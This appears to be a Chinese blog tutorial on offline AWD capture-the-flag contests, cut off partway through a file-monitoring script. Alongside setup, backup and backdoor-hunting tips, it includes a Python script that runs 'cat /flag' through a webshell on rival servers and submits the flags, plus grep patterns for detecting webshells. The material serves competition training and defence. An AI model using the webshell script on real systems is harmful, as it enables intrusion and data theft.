@@ -1,0 +1,1004 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="leekos">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="[TOC] CTF线下赛AWD知识点AWD规则 AWD：Attack With Defence，即攻防对抗，比赛中每个队伍维护多台服务器（一般两三台，视小组参赛人数而定），服务器中存在多个漏洞（web层、系统层、中间件层等），利用漏洞攻击其他队伍可以进行得分，加固时间段可自行发现漏洞对服务器进行加固，避免被其他队伍攻击失分。   1.一般分配Web服务器，服务器（多数为Linux）某处存在flag">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Tranquility">
+<meta property="og:url" content="https://leekosss.github.io/2023/08/24/CTF%E7%BA%BF%E4%B8%8B%E8%B5%9BAWD%E7%9F%A5%E8%AF%86%E7%82%B9/index.html">
+<meta property="og:site_name" content="Tranquility">
+<meta property="og:description" content="[TOC] CTF线下赛AWD知识点AWD规则 AWD：Attack With Defence，即攻防对抗，比赛中每个队伍维护多台服务器（一般两三台，视小组参赛人数而定），服务器中存在多个漏洞（web层、系统层、中间件层等），利用漏洞攻击其他队伍可以进行得分，加固时间段可自行发现漏洞对服务器进行加固，避免被其他队伍攻击失分。   1.一般分配Web服务器，服务器（多数为Linux）某处存在flag">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2023/07/28/3vV7jfCBModAYlw.png">
+<meta property="article:published_time" content="2023-08-24T15:43:38.455Z">
+<meta property="article:modified_time" content="2023-08-01T12:58:10.468Z">
+<meta property="article:author" content="leekos">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://s2.loli.net/2023/07/28/3vV7jfCBModAYlw.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>Tranquility</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"leekosss.github.io","root":"/","version":"1.9.5-a","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Tranquility</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text=""></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-08-24 23:43" pubdate>
+          2023年8月24日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          29k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          242 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header"></h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：2023年8月1日 晚上
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <p>[TOC]</p>
+<h1 id="CTF线下赛AWD知识点"><a href="#CTF线下赛AWD知识点" class="headerlink" title="CTF线下赛AWD知识点"></a>CTF线下赛AWD知识点</h1><h2 id="AWD规则"><a href="#AWD规则" class="headerlink" title="AWD规则"></a>AWD规则</h2><blockquote>
+<p>AWD：<code>Attack With Defence</code>，即攻防对抗，比赛中每个队伍维护多台服务器（一般两三台，视小组参赛人数而定），服务器中存在多个漏洞（web层、系统层、中间件层等），利用漏洞攻击其他队伍可以进行得分，加固时间段可自行发现漏洞对服务器进行加固，避免被其他队伍攻击失分。</p>
+</blockquote>
+<ul>
+<li>1.一般分配Web服务器，服务器（多数为Linux）某处存在flag（一般在根目录下）；</li>
+<li>2.可能会提供一台流量分析虚拟机，可以下载流量文件进行数据分析（较少提供）；</li>
+<li>3.flag在主办方的设定下每隔一定时间刷新一轮；</li>
+<li>4.各队一般都有一个初始分数；</li>
+<li>5.flag一旦被其他队伍拿走，该队扣除一定积分；</li>
+<li>6.得到flag的队伍加分；</li>
+<li>7.一般每个队伍会给一个低权限用户，非root权限；</li>
+<li>8.主办方会对每个队伍的服务进行check，服务器宕机扣除本轮flag分数，扣除的分值由服务check正常的队伍均分。</li>
+</ul>
+<h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><h3 id="SSH登录"><a href="#SSH登录" class="headerlink" title="SSH登录"></a>SSH登录</h3><h4 id="口令登录"><a href="#口令登录" class="headerlink" title="口令登录"></a>口令登录</h4><p>ssh口令登录格式：(默认22端口)</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ssh</span> 用户名<span class="hljs-variable">@ip</span> -p 端口号<br>例如：<br>ssh ctf@<span class="hljs-number">192.168.56.128</span> -p <span class="hljs-number">2201</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="密钥登录"><a href="#密钥登录" class="headerlink" title="密钥登录"></a>密钥登录</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ssh -<span class="hljs-selector-tag">i</span> 私钥文件路径 用户名@ip -<span class="hljs-selector-tag">p</span> 端口<br>ssh -<span class="hljs-selector-tag">i</span> /xxx/id_rsa ctf@<span class="hljs-number">192.168</span>.<span class="hljs-number">56.128</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-number">2201</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="改密码"><a href="#改密码" class="headerlink" title="改密码"></a>改密码</h3><p>官方给出的服务器密码有可能是默认的，这时我们需要赶快修改密码</p>
+<p>如果我们发现每个队伍的SSH账号密码都是一样的，我们需要立即修改口令，同时可以准备好脚本，进行利用</p>
+<h4 id="SSH密码修改"><a href="#SSH密码修改" class="headerlink" title="SSH密码修改"></a>SSH密码修改</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">passwd</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="mysql密码修改"><a href="#mysql密码修改" class="headerlink" title="mysql密码修改"></a>mysql密码修改</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mysql"># 法一<br>use mysql;<br>set password for root@localhost = password(&#x27;需要修改的密码&#x27;); # 此处使用password()函数加密<br>flush privileges;<br><br># 法二<br>update user set password = PASSWORD(&#x27;需要修改的密码&#x27;) where user = &#x27;root&#x27;;<br>flush privileges; # 刷新<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="备份数据"><a href="#备份数据" class="headerlink" title="备份数据"></a>备份数据</h3><p>比赛开始后第一时间就要备份服务器中web目录下的文件<code>/var/www/html/</code>，为了防止对方利用漏洞进入服务器把文件全部删除了，导致服务器宕机了</p>
+<p>比赛开始后第一时间备份数据库</p>
+<h4 id="备份目录"><a href="#备份目录" class="headerlink" title="备份目录"></a>备份目录</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># z: .tar.gz的格式</span><br><span class="hljs-comment"># c: 压缩</span><br><span class="hljs-comment"># x: 解压缩</span><br><span class="hljs-comment"># v: 显示详细信息</span><br><span class="hljs-comment"># f: 指定文件</span><br><br><span class="hljs-comment"># 压缩</span><br>tar -zcvf file.tar.gz  directory_to_compress<br><br><span class="hljs-comment"># 解压</span><br>tar -zxvf file.tar.gz<br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="备份数据库"><a href="#备份数据库" class="headerlink" title="备份数据库"></a>备份数据库</h4><ul>
+<li>备份指定多个数据库</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysqldump -uroot -p123456 --databases DB1,DB2 &gt; /tmp/db.sql<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>不锁定表导出</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysqldump -uroot -proot --all-databases --skip-lock-tables &gt; /tmp/db.sql<br># --all-databases 		导出所有数据库中的表和数据，而不只是特定数据库。<br># --skip-lock-tables 	在导出过程中跳过锁定表。这可以确保在导出期间不会阻塞其他对数据库的操作。<br></code></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>恢复备份(在mysql的终端执行该命令)</li>
+</ul>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">source</span> <span class="hljs-regexp">/xxx/</span>db.sql<br></code></pre></td></tr></table></figure>
+
+<p>执行了该命令，就可以将数据库恢复</p>
+<h3 id="查找后门"><a href="#查找后门" class="headerlink" title="查找后门"></a>查找后门</h3><p>首先将服务器的源码下载下来，使用<code>D盾</code>扫描一下，看一下是不是有后门，如果有，马上删除自己服务器上的后门，同时也可以利用该后门攻击其他靶机</p>
+<p>然后使用<code>seay</code>等工具进行<strong>代码审计</strong></p>
+<h2 id="自动提交flag"><a href="#自动提交flag" class="headerlink" title="自动提交flag"></a>自动提交flag</h2><p>比赛中提交 flag 一般会带上队伍 token 和 flag，格式如下：</p>
+<figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ceylon">flag.php?token=teamtoken&amp;flag=<span class="hljs-keyword">this</span><span class="hljs-number">_</span><span class="hljs-keyword">is</span><span class="hljs-number">_f</span>lag<br></code></pre></td></tr></table></figure>
+
+<p>获取 flag 一般有两种方式：</p>
+<ol>
+<li>flag 在根目录，直接 <code>cat</code> 读取 flag</li>
+<li>在对方机器请求指定地址（curl）获取 flag</li>
+</ol>
+<p>flag 每几分钟更换一轮，手动提交显然是不太可能的，需要提前准备自动获取，提交 flag 的脚本，并根据实际情况进行修改</p>
+<p>下面这个脚本每两分钟获取一次 flag 并自动提交</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding:utf-8</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://ip:&quot;</span><br>url1 = <span class="hljs-string">&quot;&quot;</span><br>shell = <span class="hljs-string">&quot;/includes/config.php?d=system&quot;</span><br>passwd = <span class="hljs-string">&quot;c&quot;</span> <br>port = <span class="hljs-string">&quot;80&quot;</span><br>payload = &#123;passwd: <span class="hljs-string">&#x27;cat /flag&#x27;</span>&#125;<br><br>flag_server = <span class="hljs-string">&quot;http://flag_server/flag_file.php?token=%s&amp;flag=%s&quot;</span><br>teamtoken = <span class="hljs-string">&quot;team1&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">submit_flag</span>(<span class="hljs-params">target, teamtoken, flag</span>):<br>    url = flag_server % (teamtoken, flag)<br>    pos = &#123;&#125;<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+]Submitting flag:%s:%s&quot;</span> % (target, url)<br>    response = requests.post(url, data=pos)<br>    content = response.text<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+]content:%s&quot;</span> % content<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;success&quot;</span> <span class="hljs-keyword">in</span> content:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+]Success!!&quot;</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[-]Failed&quot;</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">flag</span>():<br>    f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;webshelllist.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>) <br>    f1=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;firstround_flag.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [<span class="hljs-number">8802</span>,<span class="hljs-number">8803</span>,<span class="hljs-number">8804</span>]: <br>        url1=url+<span class="hljs-built_in">str</span>(i)+shell<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;------------------------------------&quot;</span><br>            res=requests.post(url1,payload,timeout=<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">if</span> res.status_code == requests.codes.ok:<br>                <span class="hljs-built_in">print</span> url1 + <span class="hljs-string">&quot; connect shell sucess,flag is &quot;</span>+res.text<br>                <span class="hljs-comment"># 记录shell和获取的flag</span><br>                <span class="hljs-built_in">print</span> &gt;&gt;f1,url1+<span class="hljs-string">&quot; connect shell sucess,flag is &quot;</span>+res.text<br>                <span class="hljs-built_in">print</span> &gt;&gt;f,url1+<span class="hljs-string">&quot;,&quot;</span>+passwd<br>                <span class="hljs-comment"># 正则捕获flag</span><br>                <span class="hljs-keyword">if</span> re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;hello world(\w+)&#x27;</span>, res.text):   <br>                    flag = re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;hello world(\w+)&#x27;</span>, res.text).group(<span class="hljs-number">1</span>)<br>                    submit_flag(url1, teamtoken, flag)<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[-]Can not get flag&quot;</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;shell 404&quot;</span><br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-built_in">print</span> url1 + <span class="hljs-string">&quot;connect shell failed&quot;</span><br>    		<br>    f.close()<br>    f1.close()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">timer</span>(<span class="hljs-params">n</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        flag()<br>        flag()<br>        flag()<br>        time.sleep(n)<br><br>timer(<span class="hljs-number">120</span>)<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="防御思路"><a href="#防御思路" class="headerlink" title="防御思路"></a>防御思路</h2><h3 id="基础查杀"><a href="#基础查杀" class="headerlink" title="基础查杀"></a>基础查杀</h3><h4 id="寻找最近20分钟修改过的文件"><a href="#寻找最近20分钟修改过的文件" class="headerlink" title="寻找最近20分钟修改过的文件"></a>寻找最近20分钟修改过的文件</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find /var/www/html -name <span class="hljs-string">&#x27;*.php&#x27;</span> -mmin -20<br></code></pre></td></tr></table></figure>
+
+<h4 id="寻找行数最短的文件"><a href="#寻找行数最短的文件" class="headerlink" title="寻找行数最短的文件"></a>寻找行数最短的文件</h4><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-built_in">find</span> ./ -name <span class="hljs-string">&#x27;*.php&#x27;</span> | xargs wc -l | <span class="hljs-built_in">sort</span> -u<br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="关键字查杀"><a href="#关键字查杀" class="headerlink" title="关键字查杀"></a>关键字查杀</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">find . -name <span class="hljs-string">&#x27;*.php&#x27;</span> | xargs grep -n <span class="hljs-string">&#x27;eval(&#x27;</span><br>find . -name <span class="hljs-string">&#x27;*.php&#x27;</span> | xargs grep -n <span class="hljs-string">&#x27;assert&#x27;</span><br>find . -name <span class="hljs-string">&#x27;*.php&#x27;</span> | xargs grep -n <span class="hljs-string">&#x27;system()&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="查找命令执行函数"><a href="#查找命令执行函数" class="headerlink" title="查找命令执行函数"></a>查找命令执行函数</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find /var/www/html -name <span class="hljs-string">&quot;*.php&quot;</span> |xargs egrep <span class="hljs-string">&#x27;assert|eval|phpinfo\(\)|\(base64_decoolcode|shell_exec|passthru|file_put_contents\(\.\*\$|base64_decode\(&#x27;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="文件监控"><a href="#文件监控" class="headerlink" title="文件监控"></a>文件监控</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment">#use: python file_check.py ./</span><br><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> shutil<br><span class="hljs-keyword">import</span> ntpath<br><span class="hljs-keyword">import</span> time<br><br>CWD = os.getcwd()<br>FILE_MD5_DICT = &#123;&#125;      <span class="hljs-comment"># 文件MD5字典</span><br>ORIGIN_FILE_LIST = []<br><br><span class="hljs-comment"># 特殊文件路径字符串</span><br>Special_path_str = <span class="hljs-string">&#x27;drops_JWI96TY7ZKNMQPDRUOSG0FLH41A3C5EXVB82&#x27;</span><br>bakstring = <span class="hljs-string">&#x27;bak_EAR1IBM0JT9HZ75WU4Y3Q8KLPCX26NDFOGVS&#x27;</span><br>logstring = <span class="hljs-string">&#x27;log_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&#x27;</span><br>webshellstring = <span class="hljs-string">&#x27;webshell_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&#x27;</span><br>difffile = <span class="hljs-string">&#x27;diff_UMTGPJO17F82K35Z0LEDA6QB9WH4IYRXVSCN&#x27;</span><br><br>Special_string = <span class="hljs-string">&#x27;drops_log&#x27;</span>  